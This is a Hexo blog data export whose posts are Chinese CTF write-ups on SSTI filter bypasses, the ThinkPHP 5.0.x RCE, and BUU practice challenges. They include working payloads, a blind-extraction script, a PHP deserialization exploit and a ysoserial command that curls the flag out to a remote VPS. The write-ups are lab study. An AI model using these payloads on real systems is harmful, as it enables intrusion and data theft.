{"meta":{"title":"Troy3e","subtitle":null,"description":null,"author":"Troye","url":""},"pages":[{"title":"about","date":"2018-12-12T14:14:36.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"about/index.html","permalink":"/about/index.html","excerpt":"","text":"[さくら荘のhojun] 与&nbsp; Mashiro&nbsp; （ 真（ま）白（しろ） ） 对话中... bot_ui_ini()","keywords":"关于"},{"title":"client","date":"2018-12-20T15:13:35.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"client/index.html","permalink":"/client/index.html","excerpt":"","text":"直接下载 or 扫码下载：","keywords":"Android客户端"},{"title":"bangumi","date":"2019-02-10T13:32:48.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"bangumi/index.html","permalink":"/bangumi/index.html","excerpt":"","text":"","keywords":null},{"title":"comment","date":"2018-12-20T15:13:48.000Z","updated":"2019-11-16T09:29:49.000Z","comments":true,"path":"comment/index.html","permalink":"/comment/index.html","excerpt":"","text":"念两句诗 叙别梦、扬州一觉。 【宋代】吴文英《夜游宫·人去西楼雁杳》","keywords":"留言板"},{"title":"donate","date":"2018-12-20T15:13:05.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"donate/index.html","permalink":"/donate/index.html","excerpt":"","text":"","keywords":"谢谢饲主了喵~"},{"title":"categories","date":"2019-11-22T03:22:38.000Z","updated":"2019-11-22T03:23:51.477Z","comments":true,"path":"categories/index.html","permalink":"/categories/index.html","excerpt":"","text":""},{"title":"links","date":"2018-12-19T15:11:06.000Z","updated":"2019-11-16T09:29:49.000Z","comments":true,"path":"links/index.html","permalink":"/links/index.html","excerpt":"","text":"","keywords":"友人帐"},{"title":"lab","date":"2019-01-05T13:47:59.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"lab/index.html","permalink":"/lab/index.html","excerpt":"","text":"sakura主题balabala","keywords":"Lab实验室"},{"title":"music","date":"2018-12-20T15:14:28.000Z","updated":"2020-12-05T14:46:35.710Z","comments":false,"path":"music/index.html","permalink":"/music/index.html","excerpt":"","text":"","keywords":"喜欢的音乐"},{"title":"photo","date":"2019-11-22T09:24:55.000Z","updated":"2019-11-22T09:24:55.430Z","comments":true,"path":"photo/index.html","permalink":"/photo/index.html","excerpt":"","text":""},{"title":"rss","date":"2018-12-20T15:09:03.000Z","updated":"2019-11-16T09:29:49.000Z","comments":true,"path":"rss/index.html","permalink":"/rss/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-12-12T14:14:16.000Z","updated":"2019-11-16T09:29:49.000Z","comments":true,"path":"tags/index.html","permalink":"/tags/index.html","excerpt":"","text":""},{"title":"theme-sakura","date":"2019-01-04T14:53:25.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"theme-sakura/index.html","permalink":"/theme-sakura/index.html","excerpt":"","text":"Hexo主题Sakura修改自WordPress主题Sakura，感谢原作者Mashiro","keywords":"Hexo 主题 Sakura 🌸"},{"title":"video","date":"2018-12-20T15:14:38.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"video/index.html","permalink":"/video/index.html","excerpt":"","text":"var videos = [ { img: 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '放送时间: 2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' }, { img : 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' } ] .should-ellipsis{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:95%;}.should-ellipsis-full{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;}.should-ellipsis i{position:absolute;right:24px;}.grey-text{color:#9e9e9e !important}.grey-text.text-darken-4{color:#212121 !important}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}img{border-style:none}progress{display:inline-block;vertical-align:baseline}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{-webkit-box-sizing:border-box;box-sizing:border-box}*,*:before,*:after{-webkit-box-sizing:inherit;box-sizing:inherit}ul:not(.browser-default){padding-left:0;list-style-type:none}ul:not(.browser-default)>li{list-style-type:none}.card{-webkit-box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2);box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2)}.hoverable{-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s}.hoverable:hover{-webkit-box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19)}i{line-height:inherit}i.right{float:right;margin-left:15px}.bangumi .right{float:right !important}.material-icons{text-rendering:optimizeLegibility;-webkit-font-feature-settings:'liga';-moz-font-feature-settings:'liga';font-feature-settings:'liga'}.row{margin-left:auto;margin-right:auto;margin-bottom:20px}.row:after{content:\"\";display:table;clear:both}.row .col{float:left;-webkit-box-sizing:border-box;box-sizing:border-box;padding:0 .75rem;min-height:1px}.row .col.s12{width:100%;margin-left:auto;left:auto;right:auto}@media only screen and (min-width:601px){.row .col.m6{width:50%;margin-left:auto;left:auto;right:auto}}html{line-height:1.5;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif;font-weight:normal;color:rgba(0,0,0,0.87)}@media only screen and (min-width:0){html{font-size:14px}}@media only screen and (min-width:992px){html{font-size:14.5px}}@media only screen and (min-width:1200px){html{font-size:15px}}.card{position:relative;margin:.5rem 0 1rem 0;background-color:#fff;-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s;border-radius:2px}.card .card-title{font-size:24px;font-weight:300}.card .card-title.activator{cursor:pointer}.card .card-image{position:relative}.card .card-image img{display:block;border-radius:2px 2px 0 0;position:relative;left:0;right:0;top:0;bottom:0;width:100%}.card .card-content{padding:24px;border-radius:0 0 2px 2px}.card .card-content p{margin:0}.card .card-content .card-title{display:block;line-height:32px;margin-bottom:8px}.card .card-content .card-title i{line-height:32px}.card .card-reveal{padding:24px;position:absolute;background-color:#fff;width:100%;overflow-y:auto;left:0;top:100%;height:100%;z-index:3;display:none}.card .card-reveal .card-title{cursor:pointer;display:block}.waves-effect{position:relative;cursor:pointer;display:inline-block;overflow:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent;vertical-align:middle;z-index:1;-webkit-transition:.3s ease-out;transition:.3s ease-out}.waves-effect img{position:relative;z-index:-1}.waves-block{display:block}::-webkit-input-placeholder{color:#d1d1d1}::-moz-placeholder{color:#d1d1d1}:-ms-input-placeholder{color:#d1d1d1}::-ms-input-placeholder{color:#d1d1d1}[type=\"radio\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"radio\"]:not(:checked)+span{position:relative;padding-left:35px;cursor:pointer;display:inline-block;height:25px;line-height:25px;font-size:1rem;-webkit-transition:.28s ease;transition:.28s ease;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border-radius:50%}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border:2px solid #5a5a5a}[type=\"radio\"]:not(:checked)+span:after{-webkit-transform:scale(0);transform:scale(0)}[type=\"checkbox\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"checkbox\"]:not(:checked):disabled+span:not(.lever):before{border:none;background-color:rgba(0,0,0,0.42)}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):before{width:0;height:0;border:3px solid transparent;left:6px;top:10px;-webkit-transform:rotateZ(37deg);transform:rotateZ(37deg);-webkit-transform-origin:100% 100%;transform-origin:100% 100%}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):after{height:20px;width:20px;background-color:transparent;border:2px solid #5a5a5a;top:0px;z-index:0}input[type=checkbox]:not(:disabled) ~ .lever:active:before,input[type=checkbox]:not(:disabled).tabbed:focus ~ .lever::before{-webkit-transform:scale(2.4);transform:scale(2.4);background-color:rgba(0,0,0,0.08)}input[type=range].focused:focus:not(.active)::-webkit-slider-thumb{-webkit-box-shadow:0 0 0 10px rgba(38,166,154,0.26);box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-moz-range-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-ms-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)} 番组计划 这里将是永远的回忆 window.onload = function(){ videos.forEach(function(video, i){ $('#rootRow').append(` ${video.title} ${video.jp} ${video.status} ${video.title} ${video.jp} 放送时间: ${video.time} ${video.desc} ${video.status} `) }) }","keywords":"B站"},{"title":"welfare","date":"2019-11-22T09:25:13.000Z","updated":"2019-11-22T09:25:13.585Z","comments":true,"path":"welfare/index.html","permalink":"/welfare/index.html","excerpt":"","text":""}],"posts":[{"title":"SSTI比较离谱的绕过","slug":"SSTI比较离谱的绕过","date":"2021-03-29T11:14:58.000Z","updated":"2021-03-29T15:01:12.769Z","comments":true,"path":"2021/03/29/SSTI比较离谱的绕过/","link":"","permalink":"/2021/03/29/SSTI比较离谱的绕过/","excerpt":"","text":"MAR DASCTF放出来的第一道就是个SSTI。过滤很多，试了几个就没耐心做下去了。记得y1ng师傅之前写过一道这种绕过的WP，但是cnblog挂了，所以干脆就等结束了再来学习一下吧。 首先 必须要准备一个环境 这里我推荐vulhub github开源 里面集成了很多框架的漏洞。搭建完毕： 题目直接给了blacklist： Hi young boy!&lt;/br&gt; Do you like ssti?&lt;/br&gt; blacklist&lt;/br&gt; &#39;.&#39;,&#39;[&#39;,&#39;\\&#39;&#39;,&#39;&quot;&#39;,&#39;&#39;\\\\&#39;,&#39;+&#39;,&#39;:&#39;,&#39;_&#39;,&lt;/br&gt; &#39;chr&#39;,&#39;pop&#39;,&#39;class&#39;,&#39;base&#39;,&#39;mro&#39;,&#39;init&#39;,&#39;globals&#39;,&#39;get&#39;,&lt;/br&gt; &#39;eval&#39;,&#39;exec&#39;,&#39;os&#39;,&#39;popen&#39;,&#39;open&#39;,&#39;read&#39;,&lt;/br&gt; &#39;select&#39;,&#39;url_for&#39;,&#39;get_flashed_messages&#39;,&#39;config&#39;,&#39;request&#39;,&lt;/br&gt; &#39;count&#39;,&#39;length&#39;,&#39;０&#39;,&#39;１&#39;,&#39;２&#39;,&#39;３&#39;,&#39;４&#39;,&#39;５&#39;,&#39;６&#39;,&#39;７&#39;,&#39;８&#39;,&#39;９&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;&lt;/br&gt; &lt;/br&gt; 比赛的时候就试了常见的几个[]、16进制、request等一些常见的（没看到有源码） 一、UNICODE魔改字符https://www.compart.com/en/unicode/比如我们搜索{符号，就会显示几个相似的： 网上找的师傅的图： 但是我在本地测试并没有成功： 可能此方法只在特定环境下有用，据说这道题是可以用的。 二、join拼接构造globals： {% set gl=dict(glo=a,bals=a)|join%}{{gl}} 接下来就是想办法构造数字和特殊字符。（数字可用Unicode上面写了，就不赘述了一般获取这样的东西的思路是2个，要么利用config，要么利用()|select|string。当然了，一般会想着先弄到数字。数字的思路大概也是2个，要么利用内置的过滤器count或者length，要么用index。这题过滤了count和length，我考虑用index来得到数字（当然，用unicode的话就变得非常简单了，不过我只讲一下不利用unicode的思路），原理是这样： {{lipsum|string|lust}} {{(lipsum|string|list).index('f')}} 注：index取得字符第一次出现的位置但是单引号此题被过滤了，所以用拼接赋值来代替单引号的作用： {% set num=dict(f=a)|join%}{{(lipsum|string|list).index(num)}} 成功取到1 lipsum中已有下划线，所以我们还需要方括号和点。 方括号：{{(lipsum|string|list).pop(18)}} 点：attr代替 接下来就很简单了，拼接调用完事直接放别的师傅的payload： 构造出来了就可以随意组了，这位师傅的payload确实是有些复杂了，有些地方可以优化的，应该是比赛的时候没时间。flag就是文件名。总结：自己还是太懒了。。明明稍微研究一下就能出的东西，可能这就是和大师傅们的差距吧。 链接：SSTI过滤总结：https://blog.csdn.net/miuzzx/article/details/110220425WP参考：https://blog.csdn.net/rfrder/article/details/115272645https://jan.show/?p=59","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"ThinkPHP X 源码分析","slug":"ThinkPHP5-5-1-29-RCE","date":"2021-03-28T12:59:07.000Z","updated":"2021-03-29T06:03:51.338Z","comments":true,"path":"2021/03/28/ThinkPHP5-5-1-29-RCE/","link":"","permalink":"/2021/03/28/ThinkPHP5-5-1-29-RCE/","excerpt":"","text":"复现一下ThinkPHP的各种漏洞，锻炼一下自己分析源码的能力，持续更新。 ThinkPHP 5.0.x (&lt;=5.0.23) RCE分析首先查看官方log： 改进request的method方法，所以我们diffinity直接对比两个版本区别： 在5.0.24中对method作了白名单的限制，只允许$this-&gt;method为常用的几个方法，否则就将其置为POST方法，因此我们的入口点就可以从Request.php跟进。(如果按正常思路寻找的话，index.php-&gt;start.php-&gt;routeCheck-&gt;check 也是可以跟到method的)全局搜索call_user_func，在Request.php中发现在filterValue方法中。 private function filterValue(&amp;$value, $key, $filters) { $default = array_pop($filters);//弹出并返回 array 数组的最后一个单元，并将数组 array 的长度减一。 foreach ($filters as $filter) { if (is_callable($filter)) {//是否能调用 $value = call_user_func($filter, $value); } elseif (is_scalar($value)) {//检测变量是否是一个标量 if (false !== strpos($filter, &#39;/&#39;)) {//strpos检测字符第一次出现 // 正则过滤 if (!preg_match($filter, $value)) { // 匹配不成功返回默认值 $value = $default; break; } } elseif (!empty($filter)) { // filter函数不存在时, 则使用filter_var进行过滤 // filter为非整形值时, 调用filter_id取得过滤id $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter)); if (false === $value) { $value = $default; break; } } } } return $this-&gt;filterExp($value); } 自己尝试理解下，首先default被赋予filters的最后一个值，然后一个个尝试filters里剩下的值是否为能调用的函数，是的话直接调用，不是的话检测value里是否是一个标量，是的话继续判断filter里有无/，有则将default即filters的最后一个值赋给它。否则（这个否则是针对filters里是否有/）判断filter是否为空，不为空则进行源码注释里的判断。看似莫名其妙，所以我们全局搜一下调用filterValue的方法： input里面调用了它。无论$data是不是数组最终都会调用filterValue方法，而$filter则会进行过滤器解析，跟进$this-&gt;getFilter方法查看解析过程: 说实话这个我没太理解 暂且继续往下看回到input方法中，array_walk_recursive函数会对第一个数组参数中的每个元素应用第二个参数的函数。在input类方法中，$data中键名作为filterValue(&amp;$value, $key, $filters)中的value,键值作为key,filter作为第三个参数$filters,而当这些传入到filterValue后，call_user_func又是利用filter作为回调的函数，value作为回调函数的参数，因此也就是input方法中的data是回调函数的参数，filter是需要回调的函数。了解之后我们需要查找input方法在何处被调用，全局搜索一下：同文件param方法最后调用该方法并作为返回： $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false)); 作为data传入input，跟进$this-&gt;get 如果$this-&gt;get为空，直接将其赋值为$_GET,而最后将$this-&gt;get作为input方法的第一个参数，因此我们可以听过变量覆盖，直接将$this-&gt;get赋值，就此我们控制了回调函数和参数。 即_method=__construct&amp;filter[]=system&amp;get[]=whoami或者_method=__construct&amp;filter[]=system&amp;route[]=whoami。 重新推一下，我们可以控制Request类所有方法及属性。在param方法里，$method = $this-&gt;method(true);跟一下method 再跟进server： $name的值是REQUEST_METHOD。server()方法中又跟进了input()方法，第一个参数$this-&gt;server可以利用之前__construct()方法进行属性覆盖，因此$this-&gt;server可控。跟进input()方法： $name是REQUEST_METHOD，会进入if (‘’ != $name) {。这些代码就相当于$data=$data[‘REQUEST_METHOD’]。而$data就是可控的$this-&gt;server，因此这里$data也可控。再往下看： 相当于$filter=$this-&gt;filter，因此过滤器也可控。接下来就进入了filterValue方法，$data是可控的参数，$filter是可控的函数，再进入利用call_user_func即可RCE。最终构造： _method=__construct&amp;filter=system&amp;server[REQUEST_METHOD]=dir 成功执行，危害极大。 漏洞原因：method没有进行限制，导致可以任意调用、覆盖类和属性。参考：https://www.anquanke.com/post/id/222672https://blog.csdn.net/rfrder/article/details/114298944","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"Real","slug":"Real","permalink":"/tags/Real/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"BUU近期刷题记录","slug":"BUU近期刷题记录","date":"2021-03-28T12:44:20.000Z","updated":"2021-03-28T13:02:18.469Z","comments":true,"path":"2021/03/28/BUU近期刷题记录/","link":"","permalink":"/2021/03/28/BUU近期刷题记录/","excerpt":"","text":"[Black Watch 入群题]Web2Secret [Zer0pts2020]phpNantokaAdmin关键词：sqlite trick根据提示这是一个 Sqlite 数据库，相应的操作有创建表、插入值和删除表，那么有可能存在注入的是创建表和插入值，但是插入值那里似乎注不了，所以注入点应该在创建表那里首先我们需要知道 Sqlite 的一些特性当 Sqlite 进行 select 时，可以用[]、’、” 和 ` 来装饰列名，位于列名后面的字段被称为别名，如create table 时支持一种 as 的语法参数处有 32 长度的字符限制，所以我们不能进行常规的查表查字段，不过我们直接直接查询当前表的 sql 语句，还有过滤了一些标点符号，其中过滤了注释符 – ，可以用 ; 进行闭合查询当前表的数据操作table_name=kk as select [sql][&amp;columns[0][name]=1&amp;columns[0][type]=]from sqlite_master; [FBCTF2019]Products Manager关键词：mysql trickwww.zip注册个facebook后面跟大于六十个空格的账号然后facebook登陆即可。https://www.cnblogs.com/wkzb/p/12286303.html [网鼎杯 2020 朱雀组]Think Java参考：https://www.bilibili.com/video/av840794036/；https://blog.csdn.net/weixin_43610673/article/details/106214366关键词：jdbc trick；java 反序列化给了源码，很容易跟踪到sql注入处（jdgui）。dbName可控，源码如下dbName = “jdbc:mysql://mysqldbserver:3306/“ + dbName;这里是一个jdbc的trickjdbc:mysql://mysqldbserver:3306/?dbName=myapp?a=’ union select group_concat(pwd)from(user)#在jdbc后面加问号可以引用其一些属性。注出密码：admin@Rrrr_ctf_asde，但是仍需要登录接口。接下来看到一开始就在跑的dirsearch跑出/swagger-ui.html，也有师傅说看到import io.swagger.annotations.ApiOperation;应该能想到有swagger-ui.html登陆成功，得到一串rO0A开头的代码，是Java序列化base64加密的数据开头。如果以aced开头，那么他就是这一段Java序列化的16进制/common/user/current 查看用户信息，auth 头是一个序列化后的信息，在查看用户信息时提交这个Bearer token进行反序列化。用ysoserial 打java -jar ysoserial-0.0.5.jar ROME “curl http://121.196.169.53:3333 -d @/flag” | base64 -w 0current打过去，VPS监听3333端口我这里直接带出数据，看到有的师傅能拿到权限有的不能，发生甚么事了。弹shell命令：https://www.cnblogs.com/20175211lyz/p/12397933.html [HCTF 2018]Hideandseek关键词：软链接文件读取 session伪造 伪随机数ln -s /proc/self/environ troyezip -y troye.zip troye读取的内容： HOSTNAME=4ae8a62e14bcSHLVL=1PYTHON_PIP_VERSION=19.1.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/uwsgi.iniWERKZEUG_SERVER_FD=3NGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/static_=/usr/local/bin/pythonUWSGI_CHEAPER=2WERKZEUG_RUN_MAIN=trueNGINX_VERSION=1.15.8-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.15.8.0.2.7-1~stretchLANG=C.UTF-8PYTHON_VERSION=3.6.8NGINX_WORKER_PROCESSES=1LISTEN_PORT=80STATIC_INDEX=0PWD=/appPYTHONPATH=/appSTATIC_PATH=/app/staticFLAG=not_flag 无key，继续读取/app/uwsgi.ini[uwsgi]module = maincallable=applogto = /tmp/hard_t0_guess_n9p2i5a6d1s_uwsgi.log 继续读取源码/app/main读不出来，看了wp可能是buu环境问题，这里应该显示/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py 所以读取/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py部分代码：random.seed(uuid.getnode())app = Flask(name)app.config[‘SECRET_KEY’] = str(random.random()*100)显然是个伪随机数，百度uuid.getnode()得：on a machine with multiple network interfaces the MAC address of any one of them may be returned.（这个函数可以获取网卡mac地址并转换成十进制数返回）/proc/net/arp查看连接到本机的远端ip的mac地址/sys/class/net/eth0/address 查看eth0的mac地址（用这个）得到02:42:ac:10:b7:0epython3 flask_session_manager.py encode -s ‘61.372777952686’ -t “{‘username’:’admin’}” [FireshellCTF2020]URL TO PDF关键词：WeasyPrint看上去是ssrf，但是输啥都是invalid url。连一下自己服务器试试：User-Agent: WeasyPrint 51 (http://weasyprint.org/)google 可以解析或在自己vps上布置一个html即可。 PyCalX 1&amp;2关键词：python参考：https://www.secpulse.com/archives/73724.html首先是PyCalX 1：（这道题1和2放一起了根据源码，flag已经在FLAG变量里了，所以只要想办法读取即可。但是有两个过滤的函数 def get_value(val): val = str(val)[:64] if str(val).isdigit(): return int(val) blacklist = [&#39;(&#39;,&#39;)&#39;,&#39;[&#39;,&#39;]&#39;,&#39;\\&#39;&#39;,&#39;&quot;&#39;] # I don&#39;t like tuple, list and dict. if val == &#39;&#39; or [c for c in blacklist if c in val] != []: print(&#39;&lt;center&gt;Invalid value&lt;/center&gt;&#39;) sys.exit(0) return val def get_op(val): val = str(val)[:2] list_ops = [&#39;+&#39;,&#39;-&#39;,&#39;/&#39;,&#39;*&#39;,&#39;=&#39;,&#39;!&#39;] if val == &#39;&#39; or val[0] not in list_ops: print(&#39;&lt;center&gt;Invalid op&lt;/center&gt;&#39;) sys.exit(0) return val 本地精简代码测试一下paylaod #coding=utf-8import sysfrom html import escape def get_value(val): val = str(val)[:64] if str(val).isdigit(): return int(val) blacklist = [‘(‘, ‘)’, ‘[‘, ‘]’, ‘\\’’, ‘“‘] # I don’t like tuple, list and dict. if val == ‘’ or [c for c in blacklist if c in val] != []: print(‘Invalid value‘) sys.exit(0) return val def get_op(val): val = str(val)[:2] list_ops = [‘+’, ‘-‘, ‘/‘, ‘*’, ‘=’, ‘!’] if val == ‘’ or val[0] not in list_ops: print(‘Invalid op‘) sys.exit(0) return val value1=”1”value2=”2”op=”+”value1=get_value(value1)value2=get_value(value2)op=get_op(op)calc_eval = str(repr(value1)) + str(op) + str(repr(value2))result = str(eval(calc_eval))print(‘&gt;&gt;&gt;&gt; print(‘+escape(calc_eval)+’)’)print(result) 其中get_op函数是两位但是却只检测第一位，很明显可以利用。repr() 函数将对象转化为供解释器读取的形式，当传入不是数字是字符串的时候，会引入引号。所以当我们传入value1=’a’,value2=’a’,op=”+’”时，语句变为’a’+’’a’，肯定会报错。注释掉后面那个引号后，即 value1=’a’,value2=’#a’,op=”+’”，语句变为’a’+’’#a’ 输出a，单引号成功逃逸。利用 value1=”a” value2=” and 1#a” op=”+’” 语句为’a’+’’ and 1 #a。先加法后与运算，输出1。然而这里无法直接输出flag，因为输出有一个条件：if result.isdigit() or result == ‘True’ or result == ‘False’: print(result)result必须有结果或者是bool值。但是由于过滤了括号 方括号，很难直接进行判断。这里要用到之前的source变量。 arguments = cgi.FieldStorage() if ‘source’ in arguments: source = arguments[‘source’].valueelse: source = 0 if source == ‘1’: print(‘‘+escape(str(open(file,’r’).read()))+’‘) source赋值使用后仍然存在，是我们的可控点，且无过滤函数，我们可以通过它配合in进行猜解Flag，猜解成功页面返回True，错误则返回Flase。 ?value1=a&amp;op=%2b%27&amp;value2=and%20True%20and%20source%20in%20FLAG%23&amp;source=f返回TrueExp： import requestsfrom urllib.parse import quote flag = “flag{“url = “http://ff388d1d-d624-45f2-baad-198952fd236b.node3.buuoj.cn/cgi-bin/pycalx.py?value1=a&amp;op=%2b%27&amp;value2=and%20True%20and%20source%20in%20FLAG%23&amp;source={0}”.format(quote(flag))for a in range(1,100): url = “http://ff388d1d-d624-45f2-baad-198952fd236b.node3.buuoj.cn/cgi-bin/pycalx.py?value1=a&amp;op=%2b%27&amp;value2=and%20True%20and%20source%20in%20FLAG%23&amp;source={0}”.format(quote(flag)) for i in range(32,128): nurl = url + quote(chr(i)) r = requests.get(url=nurl) #print(nurl) if &quot;False&quot; in r.text: nurl = url continue else: flag+=chr(i) print(flag) 忘记用二分法确实是有些憨批了。PyCalx2过滤了op里的引号。根据上一题的Flag，可以知道版本是python3.6，这里需要使用F-strings.。（原题flag）F-strings提供了一种明确且方便的方式将python表达式嵌入到字符串中来进行格式化。使用F-strings我们不用逃逸单引号，因为它支持表达式。 以f 开头，表达式插在大括号{} 里，在运行时表达式会被计算并替换成对应的值。 str(repr(‘T’))+str(‘+f’)+str(repr(‘ru{FLAG&lt;source or 14:x}’)) # 14的十六进制表示时’e’“‘T’+f’ru{FLAG&lt;source or 14:x}’”eval(str(repr(‘T’))+str(‘+f’)+str(repr(‘ru{1 or 14:x}’)))‘Tru1’ # 返回Invalideval(str(repr(‘T’))+str(‘+f’)+str(repr(‘ru{0 or 14:x}’)))‘True’ [极客大挑战 2020]Greatphp关键词：php内置类的利用参考：https://github.com/WAY29/geek-2020-challenges/blob/main/roamphp7-greatphp/wp/wp.mdhttps://cn-sec.com/archives/286121.html（PHP原生类利用小结，很不错） class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) ){ if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#39;/&quot;, $this-&gt;syc, $match)){ eval($this-&gt;syc); } else { die(&quot;Try Hard !!&quot;); } } } } 正常来看的话，又要过if又要过waf还要命令执行，似乎是一件不可能的事情。所以这里要用到内置类error。考点是md5/sha1可以对一个类进行hash,会触发一个类的__toString方法,这里由于没有可以利用的类,所以需要寻找原生类,比如Error,Exception等,然后由于Error的toString是无法完全控制的,会有其他输出,所以使用?&gt;&lt;?=的方式结束php从而完整控制整块代码,(这里有个坑就是Error必须不等,但toString生成的结果必须相等,由于toString生成的结果包含当前代码所在的行,所以新生成的2个实例必须在同一行),因为禁用了小括号无法调用函数,尝试直接include “/flag”即可. exp： &lt;?php class SYCLOVER { public $syc; public $lover; public function __wakeup() { if (($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc) === sha1($this-&gt;lover))) { if (!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#39;/&quot;, $this-&gt;var1, $match)) { eval($this-&gt;syc); } else { die(&quot;Try Hard !!&quot;); } } } } $str = &quot;?&gt;&quot;.&quot;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;; $a = new Exception($str, 1);$b = new Exception($str, 2); $c = new SYCLOVER(); $c-&gt;syc = $a; $c-&gt;lover = $b; echo(urlencode(serialize($c))); ?&gt; [网鼎杯 2020 半决赛]faka关键词：tp5一个发卡平台没找到明显的利用点，这种现成的平台基本上都是有cve的。给了源码，在tk.sql找到admin密码，解密得admincccbbb123，成功登录后台。有点像之前一个更换主题getshell的，但这里不是。有两种解法。 一、任意文件读取seay也提示这里可能存在任意文件读取。但是提示的位置有600处没注意到。位置：application/manage/controller/Backup.php源码： function downloadBak() { $file_name = $_GET[‘file’]; $file_dir = $this-&gt;config[‘path’]; if (!file_exists($file_dir . “/“ . $file_name)) { //检查文件是否存在 return false; exit; } else { $file = fopen($file_dir . “/“ . $file_name, “r”); // 打开文件 // 输入文件标签 header(‘Content-Encoding: none’); header(“Content-type: application/octet-stream”); 